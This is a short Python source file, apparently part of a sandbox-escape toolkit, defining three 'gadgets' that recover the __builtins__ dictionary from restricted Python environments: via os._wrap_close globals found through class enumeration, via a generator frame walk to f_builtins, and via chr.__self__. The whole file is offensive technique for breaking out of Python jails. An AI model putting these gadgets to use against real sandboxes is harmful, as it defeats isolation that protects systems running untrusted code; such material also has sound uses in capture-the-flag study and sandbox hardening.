"""
Gadgets for obtaining the builtins dict
"""

# the issue with splitting this is wrap_close has its own very specific globals that contains os module stuff
def builtins_dict__wrap_close(*, list_classes, str):
    return [c for c in list_classes if 'wrap_close' in str(c)][0].__init__.__globals__['__builtins__']
#TODO a manual ver?

def builtins_dict__gi_builtins():
    g = (g.gi_frame.f_back for x in [1])
    return [x for x in g][0].f_back.f_back.f_builtins

def builtins_dict__self():
    # builtin func.__self__
    return chr.__self__
